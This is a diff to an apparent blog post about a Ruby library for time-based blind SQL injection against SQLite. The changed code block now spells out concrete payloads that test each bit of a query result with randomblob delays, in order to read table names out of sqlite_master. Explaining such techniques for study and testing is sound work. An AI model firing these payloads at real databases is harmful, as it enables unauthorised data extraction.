@@ -349,12 +349,12 @@ find the perfect randomblob parameter that would cause that delay, once found, <
 <div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#007f7f"># @sqli being a SQLitei::TimeBasedBlind object</span>
 @sqli.run_sql(<span style="color:#0ff;font-weight:bold">&#34;select group_concat(tbl_name,&#39;;&#39;) from sqlite_master where type=&#39;table&#39;&#34;</span>)
 </code></pre></div><p>The library would yield conditions like this to the block, to be evaluated, and would measure timings, and return the data.</p>
-<pre><code>unicode(substr(cast((#{query}) as blob), 1, 1))&amp;1&lt;&gt;0 and randomblob(1000000)
-unicode(substr(cast((#{query}) as blob), 1, 1))&amp;2&lt;&gt;0 and randomblob(1000000)
-unicode(substr(cast((#{query}) as blob), 1, 1))&amp;4&lt;&gt;0 and randomblob(1000000)
+<pre><code>unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&amp;1&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&amp;2&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&amp;4&lt;&gt;0 and randomblob(1000000)
 ...
-unicode(substr(cast((#{query}) as blob), 1, 1))&amp;128&lt;&gt;0 and randomblob(1000000)
-unicode(substr(cast((#{query}) as blob), 2, 1))&amp;1&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&amp;128&lt;&gt;0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 2, 1))&amp;1&lt;&gt;0 and randomblob(1000000)
 ...
 </code></pre><p>If a bit is 1, it should get to the second part of the <code>and</code>, which should take some time to run, this is how the library knows the outcome of the condition.</p>
 <p>I also had to refactor code when adding support for <code>SQLite</code>, because I noticed there was a lot of code shared between DBMS-specific implementations, on blind queries mostly, so I added a <code>Utils</code> mixin that acts like an interface that
